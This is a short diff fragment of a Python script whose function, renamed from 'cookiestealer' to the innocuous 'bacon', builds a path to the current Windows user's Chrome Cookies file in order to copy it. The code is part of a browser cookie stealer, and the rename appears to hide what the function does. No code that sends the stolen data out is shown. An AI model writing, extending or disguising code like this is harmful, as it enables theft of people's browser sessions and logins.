@@ -15,7 +15,7 @@ usr = getpass.getuser()
 
 os.makedirs(cookieDir) 
 
-def cookiestealer():
+def bacon():
 	cookiepath = 'C://Users//' + usr + '//AppData//Local//Google//Chrome//User Data//Default//'
 
 	copycookie = cookiepath + "//Cookies" 
